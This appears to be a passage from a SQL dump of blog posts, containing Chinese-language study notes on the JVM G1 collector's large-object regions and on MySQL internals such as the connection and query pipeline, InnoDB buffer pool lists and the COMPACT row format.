大对象Region\n![JVM垃圾回收G1的大对象Region.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626613051_JVM-垃圾回收-G1的大对象Region.png)\n```java\n不同于之前垃圾回收器会直接把大对象进入老年代。\nG1提供了专门的Region来存放大对象，而不是让大对象进入老年代的Region中。\n在G1中，大对象的判定规则是一个大对象超过了一个Region大小的50%。\n比如按照每个Region是2MB，只要一个大对象超过了1MB，就会被放入大对象专门的Region中。\n而且一个大对象如果太大，可能会横跨多个Region来存放。\n\n// 60%的给新生代，40%的给老年代，那还有哪些Region给大对象？\n在G1里，新生代和老年代的Region是不停的变化的。\n比如新生代现在占据了1200个Region，但是一次垃圾回收之后，就让里面1000个Region都空了。\n此时那1000个Region就可以不属于新生代了，里面很多Region可以用来存放大对象。\n\n// 大对象既然不属于新生代和老年代，那什么时候会触发垃圾回收?\n新生代、老年代在回收的时候，会顺带带着大对象Region一起回收。\n```', 0, 0, 172, 0, 0, '2020-12-23 20:16:31', '2020-12-23 20:16:31', 0, 0);
INSERT INTO `article` VALUES (108, 1, 'mysql基本架构', '2021/5/1621078336_mmexport1621058520871.jpg', '### 基本架构\n![Mysql基本架构.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625225890_Mysql-基本架构.png)\n```java\n// Server层与存储引擎层\n从大体上来看,mysql分为Server层和存储引擎层两部分\n// Server层\nServer层包括连接器、查询缓存、分析器、优化器、执行器等组件\nServer层涵盖mysql的所有内置函数,比如日期、时间、数学、加密）\nServer层涵盖mysql大多数的主要核心服务功能和跨存储引擎功能,比如存储过程、触发器、视图等\n\n// 存储引擎层\n存储引擎层负责数据的存储和提取。\n存储引擎的架构模式是插件式的,可扩展,比如支持 InnoDB、MyISAM、Memory 等多个存储引擎\n不同的存储引擎共用一个 Server 层\n\n// 不同存储引擎的区别\n现在最常用的存储引擎是 InnoDB，MySQL 5.5.5版本后默认存储引擎就是InnoDB\n当执行 create table 建表时，如果不指定引擎类型，默认使用的就是 InnoDB。\n当然建表时也可以通过指定存储引擎的类型来选择别的引擎。\n不同存储引擎的表数据存取方式不同\n\n```\n### 连接器\n```java\n// 连接器\n连接器顾名思义,是用来连接到数据库上的,当你连接到数据库上,这时接待你的就是连接器。\n连接器负责跟客户端建立连接、获取权限、维持和管理连接\nmysql -h{$ip} -P{$port} -u{$user} -p\n输入完命令后,再输入密码,接着客户端与mysql开始连接,进行tcp握手连接\n连接后,连接器第一步先验证用户名和密码是否正确\n	- 如果用户名或密码不对，会收到一个\"Access denied for user\"的错误，然后客户端程序结束执行\n	- 如果用户名密码认证通过，连接器会到权限表里面查出你拥有的权限。之后这个连接里面的权限判断逻辑，都将依赖于此时读到的权限。\n正因为连接器依赖连接后的权限判断逻辑, 所以用户成功建立连接后，即使用管理员账号对这个用户的权限做了修改，也不会影响已经存在连接的权限。\n当管理员把权限修改完成后,用户只有再重新新建连接才能使用新的权限\n\n// 空闲连接8小时后断开\n当连接成功完成后,如果客户端没有后续的动作,这个连接就会处空闲状态\n使用show processlist 命令可以看到它,Command列显示为\"Sleep\",就说明这个行的这个连接是空闲连接\n如果客户端太长时间都没动静，连接器就会自动将它断开。\n这个时间是由参数 wait_timeout 控制的，默认值是 8 小时\n如果连接被断开后，客户端发送请求的话，就会收到一个错误提醒： Lost connection to MySQL server during query。\n这时如果你要继续，就需要重连，然后再重新执行请求。\n\n// 数据库的长连接\n数据库的长连接指连接成功后,客户端的持续请求一直使用同一个连接\n数据库的短连接指每次执行很少的几次请求就断开连接,下次请求再重新建立一个\n连接连接是复杂且耗时,所以尽量使用长连接\n但是当所有连接都是长连接后,mysql的内存会涨的非常快\n这是因为myqsl执行过程中临时使用的内存是管理在连接对象内部的,这些资源在连接断开时才会被释放。\n如果长连接不停的累积,可能会导致内存占用过大,被操作系统直接杀死，导致mysql挂掉\n解决这个方法有几种,比如\n	(1) 定期地断开长连接。每次使用一段时间或者程序里面判断执行过一个占用内存的大查询后，就主动断开连接，之后要查询再重连。\n	(2) mysql5.7及以后版本,可以通过执行mysql_reset_connection来重新初始化连接资源,这个重新初始化过程不需要重连和重新做连接权限验证,只是将连接恢复到刚刚创建完的状态\n\n```\n### 查询缓存\n```java\n// 查询缓存\n当连接器连接建立完成后,就可以执行 select 语句了。\n此时执行逻辑就会来到第二步：查询缓存\n当mysql 拿到一个查询请求后,会先到查询缓存查看\n查看之前是不是执行过这条语句,之前执行过的语句以及执行结果可能会以key-value对的形式缓存在内存中\nkey是查询语句,value就是查询的结果\n如果这条查询语句能够直接在这个缓存中找到,那么就可以直接从缓存中拿到这条查询语句的查询结果,返回给客户端\n如果语句不在查询缓存中，就会继续后面的执行阶段。执行完成后，执行结果会被存入查询缓存中。\n所以如果查询命中缓存的话，MySQL 不需要执行后续的复杂操作，就可以直接返回结果，这个效率会很高。\n\n// 不要使用查询缓存 \n大部分情况下不要使用查询缓存,因为使用查询缓存往往弊大于利。\n查询缓存的失效非常频繁，只要有一个对表的更新，那么这个表上所有的查询缓存都会被清空。\n因此有可能结果刚被缓存,就被数据一更新导致全清空\n尤其是对写多读少的数据库而言,查询缓存的命中率非常低,失去意义且耗费性能\n除非是类似系统配置表这种长时间不更新的动态表才适合使用查询缓存\nmysql的参数 query_cache_type 如果设置为DEMAND,这么就会默认不适用查询缓存,当需要使用时可以用 SQL_CACHE 在语句中显示指定\nselect SQL_CACHE * from T where ID=1；\n正因为缓存命中率低,所以mysql8之后,查询缓存整块组件被删除掉了\n\n```\n### 分析器\n```java\n// 分析器\n如果查询语句没有命中缓存的话,就会真正开始执行语句了\n首先mysql需要知道你的语句是什么意思,所以会对sql语句做解析\n分析器会先做\"词法分析\",分析这条语句的字符串分别是什么,代表什么意思。\nmysql从\"select\"这个关键字识别知道这是一个查询语句,然后它会把\"T\"识别为\"表名 T\",\"ID\"识别为\"列 ID\"\n做完这些识别后,做语法分析,判断这个sql语句是否满足mysql语法规则。\n如果语句语法不正确,会收到“You have an error in your SQL syntax”的错误提醒\n\n```\n### 优化器\n```java\n// 优化器\n查询语句经过了分析器说明语法正确,mysql知道语句要做什么了。\n但是在真正开始执行之前，还要先经过优化器的处理。\n优化器的工作是在表中有多个索引的时候,决定使用哪一个索引,以及语句有多表关联(join)的时候,决定表的连接顺序\n如果语句命中查询缓存,会做权限验证,判断一下你这个用户对这个表 T 有没有执行查询的权限\n如果\n\n```\n### 执行器\n```java\n// 执行器\nmysql通过分析器知道语句要做什么，通过优化器知道该怎么做好,下一步就进入了执行器阶段,开始正式执行语句\n开始执行的时候，会先判断一下你这个用户对这个表 T 有没有执行查询的权限，如果没有，就会返回没有权限的错误\n如果用户有权限，那么就会打开表继续执行。执行器会根据表的存储引擎,去使用这个存储引擎提供的接口。\nselect SQL_CACHE * from T where ID=1;\n如果这个id没有索引的话,那么会进行如下操作\n	(1) 调用 InnoDB 引擎接口取出这个表的第一行，判断 ID 值是不是 1，如果不是则跳过，如果是则将这行存在结果集中；\n	(2) 接着调用存储引擎接口取\"下一行\"，重复相同的判断逻辑，直到取到这个表的最后一行\n	(3) 最后执行器将上述遍历过程中所有满足条件的行组成的记录集作为结果集返回给客户端,这样这个语句就执行完成了\n对于有索引的表，执行的逻辑也是差不多的。\n第一次调用的是\"取满足条件的第一行\"这个接口，之后循环取\"满足条件的下一行\"这个接口，这些接口都是存储引擎中已经定义好的。\n数据库的慢查询日志中会看到一个 rows_examined 的字段，表示这个语句执行过程中扫描了多少行。这个值是在执行器每次调用引擎获取数据行的时候累加的。\n但是,执行器调用一次，引擎内部可能会扫描多行，因此引擎扫描的行数跟执行器记录的 rows_examined 可能并不是完全相同的。\n\n```', 0, 0, 71, 0, 0, '2021-04-11 19:32:28', '2021-04-24 19:32:28', 0, 0);
INSERT INTO `article` VALUES (109, 1, 'mysql的bufferpool与数据页', '2018/9/1537245774_52323c7f138827816fb40c0186640a63.jpg', '### Buffer Pool\n#### 基本原理\n![Mysqlbufferpool数据页.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625712856_Mysql-bufferpool-数据页.png)\n```java\nbuffer pool本质上是数据库的一个内存组件\n这个buffer pool默认大小是128MB,是偏小的,可以在配置文件中修改这个值\n[server]\ninnodb_buffer_pool_size = 2147483648\n\n// 数据页\n数据库的核心模型是按 表 + 字段 + 行的概念,但是缓存在buffer pool的数据并不是这样的模型\nmysql对数据抽象出来一个数据页的概念,它是把很多行放在一个数据页当中。\n也就是说磁盘中有很多的数据页,每个数据页里放了很多行数据\n当我们要更新一行数据,此时数据库会找到这行所在的数据页,然后把磁盘的数据页加载到buffer pool中去。\n默认情况下,磁盘存放的数据页的大小是16KB,一页数据包含了16KB的内容\n\n// 缓存页\nbuffer pool中的数据页叫做缓存页,因为buffer pool是一个缓冲池,里面的数据是从磁盘缓存到内存中去的\n每个缓存页,实际上都有有一个对应的描述信息,这个描述信息可以认为是描述这个缓存页的\n比如包含这个缓存页所属的表空间、数据页编号、该缓存页在buffer pool中的地址等等信息\n这个描述信息本身也是一块数据,在buffer pool中存储,每个缓存页的描述数据放在最前面,缓存页放在后面\n描述数据大概相当于缓存页大小的5%左右,每个描述数据大小大概是800字节左右,不到1kb,所以实际上buffer pool的大小会比默认的128MB大小要大一些\n\n```\n#### 空闲缓存页链表free\n![Mysqlbufferpoolfree链表.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625712856_Mysql-bufferpool-free链表.png)\n```java\n执行增删改查操作的时候,此时需要不停的从磁盘读取一个个的数据页到buffer pool对应的缓存页当中,把数据存起来。\n然后就可以对这个数据在内存中进行增删改查\n但是从磁盘上获取数据放入buffer pool的缓存时,要找出\"哪些缓存页是空闲的\"\n默认情况下,数据页和缓存页都是一一对应起来的,都是16KB。\n\n所以数据库设计了一个free链表,它是一个双向链表的数据结构\n这个free链表中,每个节点就是一个空闲的缓存页的描述数据块的地址。\n只要一个缓存页是空闲的,那么这个缓存页的描述数据块就会放入这个free链表中\n数据库刚启动的时候,可能所有的缓存页中都是空的,因此此时所有的缓存页的描述块都会被放入这个free链表中\n每个节点都会双向链接自己的前后节点,组成一个双向链表,\n除此之外,free链表还有一个基础节点,它会引用链表的头节点和尾节点,里面存储了链表中还有多少个描述数据块的节点(也就是还有多少个空闲的缓存页)\n\nfree链表本身就是由buffer pool里的描述数据块组成的,可以认为每个描述数据块里都有两个指针。\n一个是free_pre,一个是free_next,分别指向自己的上一个free链表的节点以及下一个free链表的节点\n对于free链表,只有一个基础节点是不属于buffer pool的,它是40字节大小的一个节点,里面存放了链表的头节点和尾节点的地址以及free链表里当前有多少个节点\n\n// 把磁盘上的数据页读取到buffer pool中空闲缓存页里去\n从free链表中获取一个描述数据块,根据描述数据块获取对应的那个空闲的缓存页\n接着把磁盘上的数据页读取到缓存页里去,同时把一些相关的描述数据块写入缓存页的描述数据块中,比如说这个数据页所属的表空间之类的信息\n最后完成后,把这个描述数据块从free链表中去除\n\n// 如何知道是否有缓存页\n执行增删改查的时候,先看有没有缓存页,如果没被缓存才走上面的逻辑\n但如果数据已经被缓存了,就可以直接使用了\n数据块里有一个哈希表数据结构,可以使用\"表空间+数据页号\",作为key,\"缓存页地址\"作为value\n当你需要使用一个数据页的时候,通过\"表空间+数据页号\"作为key去哈希表里查一下,如果没有就读取磁盘数据页,有就用缓存页\n也就是说每次读取一个数据页到buffer pool缓存后,都会在这个哈希表写入一个key-value对,key就是表空间+数据页号,value就是缓存页地址,下次如果再使用这个数据页,就可以直接从哈希表里直接读取出来这个缓存页地址并使用了\n\n// 如何知道数据的数据页号\n系统表空间中存储了所有索引对应根节点的页号,根据根节点的页号找到目录项。\n再用slot 槽二分法找到对应的那组最大记录（此时是目录项），再往后迭代目录项，直到找到对应的目录项； 而这个目录项也会指向对应的页，直到一层一层找到叶子节点；\n\n```\n#### 脏数据flush链表\n![Mysqlbufferpoolflush链表.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625712856_Mysql-bufferpool-flush链表.png)\n```java\n// 脏数据 脏页\n执行增删改查的时候,如果发现有缓存页,就会直接更新使用。\n此时一旦更新了缓存页的数据,那么缓存页上的数据和磁盘上的数据页里的数据,就不一致了\n这个时候,我们就说缓存页是脏数据,脏页\n\n// flush链表\n最终这些在内存更新的脏页的数据,都是一定要刷回磁盘文件的\n但这里就有个问题了,不可能所有的缓存页都要刷回磁盘,因为有的缓存页可能是因为查询的时候被读取到buffer pool中的,但是根本没修改过\n数据库于是在这里引入另一个和free链表类似的flush链表\n这个flush链表本质也是通过缓存页的描述数据块中的两个指针,让被修改过的缓存页的描述数据块组成一个双向链表\n凡是被修改过的缓存页,都会把它的描述数据块加入到flush链表中去。\nflush的意思是这些都是脏页,后续都是要flush刷新到磁盘上的\n\n```\n#### 淘汰缓存页lru链表\n![Mysqlbufferpoollru链表冷热数据分离.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625712856_Mysql-bufferpool-lru链表-冷热数据分离.png)\n```java\n// 如果buffer pool中的缓存页不够了怎么办\n当不停的把磁盘上的数据页加载到空闲的缓存页里去,free链表不停的移除空闲缓存页,迟早会发现free链表中的缓存页不够用了\n如果所有的缓存页都被塞了数据,此时无法从磁盘上加载新的数据页到缓存页里去了,那么此时只能淘汰一些缓存页\n顾名思义,必须把一个缓存页里被修改过的数据,刷回到磁盘上的数据页里去,然后这个缓存页就可以清空了,重新变成一个空闲的缓存页\n接着你就可以把磁盘上需要的新的数据页加载到这个腾出来的空闲缓存页中去\n\n// 淘汰缓存页lru链表\n如果要把一个缓存页里的数据刷入磁盘,腾出来一个空闲的缓存页,那么应该把哪个缓存页的数据给刷入磁盘\n所以要接着一个问题,怎么知道哪些缓存页经常问题,哪些缓存页不常访问,我们要淘汰那些很少访问的缓存页\n此时就要引入一个lru链表了,这个所谓的LRU(Least Recetly Used),就是最少使用的意思\n\n// lru链表如何实现\n假设从磁盘加载一个数据页到缓存页时,就把这个缓存页的描述数据块放入到lru链表的头部去。\n那么最近被加载的数据的缓存页都会放到lru链表的头部去\n然后假设某个缓存页的描述数据块本来在lru链表的尾部,后续只要查询或修改了这个缓存页的数据,就把它挪动到头部。\n这样的话,最近被访问过的缓存页,一定在lru链表的头部\n当你的缓存页没有一个空闲时,找到最少被访问的缓存页刷入磁盘,此时直接找到lru链表尾部的那个缓存页,它一定是最少被访问的缓存页\n然后就可以把lru尾部的那个缓存页刷入磁盘,清空变成空闲后,把需要加载的数据页加载到腾出来这个空闲缓存页就可以了\n\n// 简单lru的隐患-预读\n上述一个简单的lru链表实现在实际运行过程中,实际上时会存在隐患的\nmysql有一个预读的机制,这个预读的机制说的是:\n当你从磁盘上加载一个数据页的时候,它可能会连带着把这个数据页相邻的邻居数据页页加载到buffer pool里去\n新加载的邻居数据页可能根本不会被访问,但是它们却占据着lru链表的头部\n\n// mysql触发预读机制\n(1) 参数 innodb_read_ahead_threshold，默认值56，意思是如果顺序的访问了一个区里的多个数据页，访问的数据页的数量超过了这个阈值，此时就会触发预读机制，把下一个相邻区中的所有数据页都加载到缓存里去\n(2) 如果buffer pool里缓存了一个区里的13个连续的数据页，而且这些数据页都是比较频繁会被访问的，此时就会直接触发预读机制，把这个区里的其他的数据页都加载到缓存里去\n这个预读机制通过参数innodb_random_read_ahead来控制，默认是OFF，也就是说这个规则默认是关闭的\n(3) 全表扫描,比如类似这样的SQL语句：SELECT * FROM USERS,可能会一下子就把这个表的所有数据页都一一装入各个缓存页里去\n全表扫描可能导致lru链表中排在前面的一大串缓存页，都是全表扫描加载进来的缓存页\n如果这次全表扫描过后，后续几乎没用到这些缓存页并且还可能导致把被频繁访问的之前的头部缓存页给挤占到尾部去了\n\n// 冷热数据分离的lru链表\n真正mysql在设计lru链表的时候,采取的是冷热数据分离的思想\nlru链表会被拆分为两个部分,一部分是热数据,一部分是冷数据\n这个冷热比例是通过参数 innodb_old_blocks_pct 控制的，默认是37，也就是说冷数据占比37%。\n当数据页第一次被加载到缓存的时候,会被放入到冷数据区域的链表头部。\ninnodb_old_blocks_time 参数，默认值1000，也就是1000毫秒\n表示的是一个数据页被加载到缓存页后,在1秒后,访问这个缓存页,就会将这个缓存页挪动到热数据区域的链表头部\n假设加载了一个数据页到缓存，过了1秒后还访问了这个缓存页，说明后续很可能会经常要访问它,它才会把缓存页放到热数据区域的链表头部去。\n这样的话,全表扫描的那些缓存页,只被访问过一次的话,就不会放入到经常频繁访问的那些缓存页的链表头部了\n\n// 清空lru链表冷数据区区域尾部\nmysql并不是在缓存页满的时候，才会挑选lru冷数据区域尾部的几个缓存页刷入磁盘\nmysql有一个后台线程，运行一个定时任务，这个定时任务每隔一段时间就会把lru链表的冷数据区域的尾部的一些缓存页刷入磁盘，清空这几个缓存页，把它们加回free链表\n这个后台线程同时也会在mysql不繁忙时，把flush链表中的缓存页都刷入磁盘中，这样被修改过的数据，迟早都会刷入磁盘\n\n```\n#### 优化-设置多个buffer pool\n![Mysqlbufferpool多bufferpool与chunk.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625712856_Mysql-bufferpool-多bufferpool与chunk.png)\n```java\nmysql可以设置多个buffer pool来优化它的并发能力\n但是机器内存很大，那么必然会给buffer pool分配较大的内存\n比如给个8G内存，那么此时是可以同时设置多个Buffer Pool的，比如说下面的MySQL服务器端的配置。\n[server]\ninnodb_buffer_pool_size = 8589934592\ninnodb_buffer_pool_instances = 4\n给buffer pool设置了8GB的总内存，设置了它应该有4个Buffer Pool，此时就是说，每个buffer pool的大小就是2GB\n这时，mysql运行时就会有4个buffer pool,每个buffer pool负责管理一部分的缓存页和描述数据块，有自己独立的free、flush、lru等链表。\n这样的话,有了多个buffer pool后，多线程并发访问的性能就会得到成倍的提升\n因为多个线程可以在不同的buffer pool中加锁和执行自己的操作\n\n// chunk\nmysql设计了一个chunk机制，buffer pool是由很多chunk组成的。\nbuffer pool的大小是 innodb_buffer_pool_chunk_size 参数控制，默认值128MB。\n\n假设给buffer pool设置总大小8GB，然后有4个buffer pool，那么每个buffer pool就是2GB。\n此时每个buffer pool是由一系列的128MB的chunk组成的，也就是说每个buffer pool会有16个chunk。\n\n每个buffer pool里的每个chunk里是一系列的描述数据块和缓存页。\n每个buffer pool里的多个chunk共享一套free、flush、lru这些链表。\n\n通常建议设置buffer pool的内存为机器内存的50%~60%左右,尽可能的保证数据库的高性能和高并发能力。\n\n```\n### 数据的存储格式\n#### 值列表\n```java\n// 对于数据页中的每一行数据在磁盘上是怎么存储的\n这里涉及到一个概念,\"行格式\"。\n我们可以对一个表指定他的行存储的格式是什么样的，比如我们用COMPACT格式。\nCREATE TABLE table_name (columns) ROW_FORMAT=COMPACT\nALTER TABLE table_name ROW_FORMAT=COMPACT\n\n可以在建表的时候就指定一个行存储的格式，也可以后续修改行存储的格式。\n这里指定了一个COMPACT行存储格式，在这种格式下，每一行数据实际存储的时候，大概格式类似下面这样：\n变长字段的长度列表，null值列表，数据头，column01的值，column02的值，column0n的值......\n\n对于每一行数据，存储的时候都会有一些头字段对这行数据进行一定的描述，然后再放上这一行数据每一列的具体的值。\n这就是所谓的行格式。除了COMPACT以外，还有其他几种行存储格式，基本都大同小异。\nmysql中有一些字段的长度是变长的，是不固定的，比如VARCHAR(10)之类的这种类型的字段。\n实际上他里面存放的字符串的长度是不固定的，有可能是“hello”这么一个字符串，也可能是“a”这么一个字符串。\n\n假设一下有一行数据，几个字段的类型为VRACHAR(10)，CHAR(1)，CHAR(1)。\n第一个字段是VARCHAR(10)，这个长度是可能变化的，所以这一行数据可能就是类似于：hello a a。\n这样子，第一个字段的值是“hello”，后面两个字段的值都是一个字符，就是一个a\n接着另外一行数据，同样也是这几个字段，他的第一个字段的值可能是“hi”，后面两个字段也是“a”。\n所以这一行数据可能是类似于：hi a a。一共三个字段\n第一个字段的长度是是不固定的，后面两个字段的长度都是固定的1个字符。\n\n假设把上述两条数据写入了一个磁盘文件里，两行数据是挨在一起的，那么这个时候在一个磁盘文件里可能有下面的两行数据：\nhello a a hi a a\n平时你看到的表里的很多行数据，最终落地到磁盘里的时候，都是上面那种样子的，一大坨数据放在一个磁盘文件里都挨着存储的。\n```\n#### 变长字段的长度列表\n```java\n// 变长字段的长度列表\n假如要读取hello a a这行数据，第一个问题就是，从这个磁盘文件里读取的时候，到底哪些内容是一行数据\n因为这个表里的第一个字段是VARCHAR(10)类型的，第一个字段的长度是多少是不知道的\n所以有可能读取出来“hello a a hi”是一行数据，也可能是你读取出来“hello a”是一行数据。\n在不知道一行数据的每个字段到底是多少长度的情况下，胡乱的去读取是不现实的，根本不知道磁盘文件里混成一坨的数据里，哪些数据是你要读取的一行\n所以要在存储每一行数据的时候，都保存一下他的变长字段的长度列表，这样才能解决一行数据的读取问题。\n也就是说，在存储“hello a a”这行数据的时候，要带上一些额外的附加信息，比如第一块就是它里面的变长字段的长度列表\n看到“hello”的长度是5，十六进制就是0x05，所以此时会在“hello a a”前面补充一些额外信息。\n首先就是变长字段的长度列表，你会看到这行数据在磁盘文件里存储的时候，其实是类似如下的格式：\n0x05 null值列表 数据头 hello a a\n假设你有两行数据，还有一行数据可能就是：0x02 null值列表 数据头 hi a a，两行数据放在一起存储在磁盘文件里，看起来是如下所示的：\n0x05 null值列表 数据头 hello a a 0x02 null值列表 数据头 hi a a\n此时要读取“hello a a”这行数据，首先会知道这个表里的三个字段的类型是VARCHAR(10) CHAR(1) CHAR(1)。\n那么此时你先要读取第一个字段的值，那么第一个字段是变长的，会发现第一行数据的开头有一个变长字段的长度列表。\n变长字段的长度列表里面会读取到一个0x05这个十六进制的数字，发现第一个变长字段的长度是5，于是按照长度为5，读取出来第一个字段的值，就是“hello”。\n接着知道后续两个字段都是CHAR(1)，长度都是固定的1个字符，于是此时就依次按照长度为1读取出来后续两个字段的值，分别是“a”“a”，于是最终你会读取出来“hello a a”这一行数据\n接着要读取第二行数据，先看一下第二行数据后的变长字段长度列表，发现第一个变长字段的长度是0x02，于是就读取长度为2的字段值，就是“hi”，再读取两个长度固定为1的字符值，都是“a”，此时读取出来“hi a a”这行数据。\n// 多个变长字段，如何存放它们的长度\n比如一行数据有VARCHAR(10) VARCHAR(5) VARCHAR(20) CHAR(1) CHAR(1)，一共5个字段。\n其中三个是变长字段，此时假设一行数据是这样的：hello hi hao a a\n此时在磁盘中存储的，必须在开头的变长字段长度列表中存储几个变长字段的长度\n一定要注意一点，这里是\"逆序存储\"的！\n先存放VARCHAR(20)这个字段的长度，然后存放VARCHAR(5)这个字段的长度，最后存放VARCHAR(10)这个字段的长度。\n现在hello hi hao三个字段的长度分别是0x05 0x02 0x03。\n但是实际存放在变长字段长度列表的时候，是逆序放的，所以一行数据实际存储可能是下面这样的：\n0x03 0x02 0x05 null值列表 头字段 hello hi hao a a\n```\n#### null值列表\n```java\n// null值列表\nNULL值列表，顾名思义，说的就是你一行数据里可能有的字段值是NULL。\n比如有一个name字段，它是允许为NULL的，那么实际上在存储的时候，如果你没给它赋值，它这个字段的值就是NULL。\n假设这个字段的NULL值我们在磁盘上存储的时候，就是按照“NULL”这么个字符串来存储，是不是很浪费存储空间\n所以实际在磁盘上存储数据的时候，一行数据里的NULL值是肯定不会直接按照字符串的方式存放在磁盘上浪费空间的。\n对所有的NULL值，不通过字符串在磁盘上存储，而是通过二进制的bit位来存储。\n一行数据里假设有多个字段的值都是NULL，那么这多个字段的NULL，就会以bit位的形式存放在NULL值列表中。\n假设有这么一张表\nCREATE TABLE customer (\n	name VARCHAR(10) NOT NULL,\n	address VARCHAR(20),\n	gender CHAR(1),\n	job VARCHAR(30),\n	school VARCHAR(50)\n) ROW_FORMAT=COMPACT;\n客户表，里面有5个字段，分别为name、address、genderjob、school，就代表了客户的姓名、地址、性别、工作以及学校。\n其中有4个变长字段和1个定长字段，第一个name字段是声明了NOT NULL的，就是不能为NULL，其他4个字段都可能是NULL的。\n如果这个变长字段的值是NULL，就不用在变长字段长度列表里存放他的值长度了。\n这行数据中，只有name和school两个变长字段是有值的，把他们的长度按照逆序放在变长字段长度列表中就可以了，如下所示：\njack NULL m NULL xx_school\n0x09 0x04 NULL值列表 头信息 column1=value1 column2=value2 ... columnN=valueN\nNULL值列表，所有允许值为NULL的字段，注意，是允许值为NULL，不是说一定值就是NULL了。\n只要是允许为NULL的字段，每个字段都有一个二进制bit位的值，如果bit值是1说明是NULL，如果bit值是0说明不是NULL。\n实际放在NULL值列表的时候，他是按逆序放的，所以在NULL值列表里，放的是：0101\n实际NULL值列表存放的时候，不会说仅仅是4个bit位，一般起码是8个bit位的倍数，如果不足8个bit位就高位补0，所以实际存放看起来是如下的：\n0x09 0x04 00000101 头信息 column1=value1 column2=value2 ... columnN=valueN\n```\n#### 数据头信息数据\n```java\n// 数据头信息数据\n每一行数据存储的时候，还有40个bit位的数据头，这个数据头是用来描述这行数据的。\n这40个bit位里，第一个bit位和第二个bit位，都是预留位，是没任何含义的。\n接着有1个bit位是delete_mask,标识的是这行数据是否被删除了，mysql里删除一行数据的时候，未必是立马把他从磁盘上清理掉，而是在数据头里修改1个bit标记表示已经被删了\n接着有1个bit位是min_rec_mask,表示在B+树里每一层的非叶子节点里的最小值都有这个标记。\n接着有4个bit位是n_owned,，记录了一个记录数。\n接着有13个bit位是heap_no,，表示当前这行数据在记录堆里的位置。\n接着有3个bit位是record_type，这行数据的类型,0代表的是普通类型，1代表的是B+树非叶子节点，2代表的是最小值数据，3代表的是最大值数据\n最后有16个bit的next_record，是指向它下一条数据的指针。\n```\n#### 实际存储\n```java\n一行数据是“jack NULL m NULL xx_school”，那么他真实存储大致如下所示：\n0x09 0x04 00000101 0000000000000000000010000000000000011001 jack m xx_school\n先是变长字段的长度，用十六进制来存储，然后是NULL值列表指出了谁是NULL，接着是40个bit位的数据头，最后是真实的数据值。\n实际上字符串这些东西都是根据我们数据库指定的字符集编码，进行编码之后再存储的，所以大致看起来一行数据是如下所示的：\n0x09 0x04 00000101 0000000000000000000010000000000000011001 626262 646420 6464646464\n字符串和其他类型的数值最终都会根据字符集编码，搞成一些数字和符号存储在磁盘上\n实际存储一行数据的时候，会在他的真实数据部分加入一些隐藏字段\n(1) DB_ROW_ID字段，这是一个行的唯一标识，数据库内部搞的一个标识，不是你的主键ID字段。\n(2) DB_TRX_ID字段，这是跟事务相关的，这是哪个事务更新的数据，这是事务ID。\n加上这几个隐藏字段之后，实际一行数据可能看起来如下所示：\n0x09 0x04 00000101 0000000000000000000010000000000000011001 00000000094C（DB_ROW_ID）00000000032D（DB_TRX_ID） EA000010078E（DB_ROL_PTR）  616161 636320 6262626262\n\n```\n### 数据页的物理存储结构\n#### 数据页存储结构\n![Mysqlbufferpool数据页存储结构.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625723857_Mysql-bufferpool-数据页存储结构.png)\n```java\n一个数据页拆分成了很多个部分，大体上来说包含了文件头、数据页头、最小记录和最大记录、多个数据行、空闲空间、数据页目录、文件尾部。\n其中文件头占据了38个字节，数据页头占据了56个字节，最大记录和最小记录占据了26个字节，数据行区域的大小是不固定的，空闲区域的大小也是不固定的，数据页目录的大小也是不固定的，然后文件尾部占据8个字节。\n每个数据页里还有专门的区域包含了多个数据行，至于每个数据行存储都就是数据,按照存储格式。\n\n缓存页跟数据页是一一对应的，在磁盘上的时候就是数据页，数据页加载到缓存页里了,就叫它缓存页\n在缓存页里插入一条数据，实际上就是在数据行那个区域里插入一行数据，然后空闲区域的空间会减少一些\n可以不停的插入数据到这个缓存页里去，直到它的空闲区域都耗尽了，就是这个页满了，此时数据行区域内可能有很多行数据\n\n```\n#### 页溢出\n![Mysqlbufferpool页溢出.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625723857_Mysql-bufferpool-页溢出.png)\n```java\n实际上每一行数据都是放在一个数据页里的，这个数据页默认的大小是16KB。\n当一行数据的大小超过了页的大小怎么办\n比如有一个表的字段类型是VARCHAR(65532)，最大可以包含65532个字符，那也就是65532个字节，这就远大于16kb的大小了，也就是说这一行数据的这个字段都远超一个数据页的大小了\n这时实际上会在那一页里存储这行数据，然后在那个字段中仅包含一部分数据,同时包含一个20个字节的指针，指向了其他的一些数据页，那些数据页用链表串联起来，存放这个VARCHAR(65532)超大字段里的数据。\n\n上述这个过程称为\"行溢出\",\n意思是一行数据存储的内容太多了，一个数据页都放不下了，此时只能溢出这个数据页，把数据溢出存放到其他数据页里去，那些数据页就叫做溢出页。\n包括其他的一些字段类型都是一样的，比如TEXT、BLOB这种类型的字段，都有可能出现溢出，然后一行数据就会存储在多个数据页里。\n\n```\n#### 表空间与数据区\n![Mysql表空间与数据区.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625723857_Mysql-表空间与数据区.png)\n```java\n平时创建的那些表，都有一个表空间的概念，在磁盘上都会对应着“表名.ibd”这样的一个磁盘数据文件\n在物理层面，表空间就是对应一些磁盘上的数据文件。\n有的表空间，比如系统表空间可能对应的是多个磁盘文件，有的我们自己创建的表对应的表空间可能就是对应了一个“表名.ibd”数据文件。\n然后在表空间的磁盘文件里，其实也会有很多很多的数据页。\n一个数据页不过就是16kb而已，一个数据页不可能是一个磁盘文件\n所以现在有一个问题，就是一个表空间里包含的数据页实在是太多了，不便于管理，所以在表空间里又引入了一个\"数据区\"的概念,英文extent。\n一个数据区对应着连续的64个数据页，每个数据页是16kb，所以一个数据区是1mb，然后256个数据区被划分为了一组。\n对于表空间而言,它的第一组数据区的第一个数据区的前3个数据页，都是固定的，里面存放了一些描述性的数据。比如FSP_HDR这个数据页，他里面就存放了表空间和这一组数据区的一些属性。\n对于表空间而言,它的其他各组数据区，每一组数据区的第一个数据区的头两个数据页，都是存放特殊信息的。\n\n```', 0, 0, 217, 0, 0, '2021-04-13 12:43:00', '2021-04-16 12:43:00', 0, 0);
